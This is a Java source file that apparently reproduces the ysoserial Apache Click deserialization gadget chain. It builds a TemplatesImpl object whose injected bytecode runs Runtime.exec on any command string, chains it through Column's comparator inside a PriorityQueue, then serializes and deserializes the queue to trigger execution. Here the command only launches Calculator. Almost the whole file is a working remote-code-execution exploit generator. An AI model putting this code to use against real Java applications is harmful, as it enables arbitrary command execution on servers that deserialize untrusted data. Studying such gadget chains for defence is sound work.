package simulation;


import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.click.control.Column;
import org.apache.click.control.Table;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysoserial.payloads.util.Reflections;

import java.io.*;
import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

/*
   Simulated Gadget Chain:
    java.util.PriorityQueue.readObject()
      java.util.PriorityQueue.heapify()
        java.util.PriorityQueue.siftDown()
          java.util.PriorityQueue.siftDownUsingComparator()
            org.apache.click.control.Column$ColumnComparator.compare()
              org.apache.click.control.Column.getProperty()
                org.apache.click.control.Column.getProperty()
                  org.apache.click.util.PropertyUtils.getValue()
                    org.apache.click.util.PropertyUtils.getObjectPropertyValue()
                      java.lang.reflect.Method.invoke()
                        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
                        ...
    Requirement:
    - Apache Click
    - servlet-api of any version
*/

public class Click1 {
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }
    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = null;
        Class clazz = obj.getClass();
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = clazz.getSuperclass().getDeclaredField(fieldName);
        }
        field.set(obj, value);
    }
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }
    public static Object createTemplatesImpl(String command) throws Exception{
        Object templates = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        ((CtClass) clazz).makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        final byte[] classBytes = clazz.toBytecode();
        setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes});
        // required to make TemplatesImpl happy
        setFieldValue(templates, "_name", "Pwnr");
        setFieldValue(templates, "_tfactory", Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
        return templates;
    }

    public static void main(String[] args) throws Exception {
        final Object templates = createTemplatesImpl("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        // mock method name until armed
        final Column column = new Column("lowestSetBit");
        column.setTable(new Table());
        Comparator comparator = (Comparator) Reflections.newInstance("org.apache.click.control.Column$ColumnComparator", column);

        // create queue with numbers and basic comparator

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        column.setName("outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = templates;
//		queueArray[1] = templates;

//        return queue;
        byte[] serializeData=serialize(queue);
        unserialize(serializeData);
    }


}
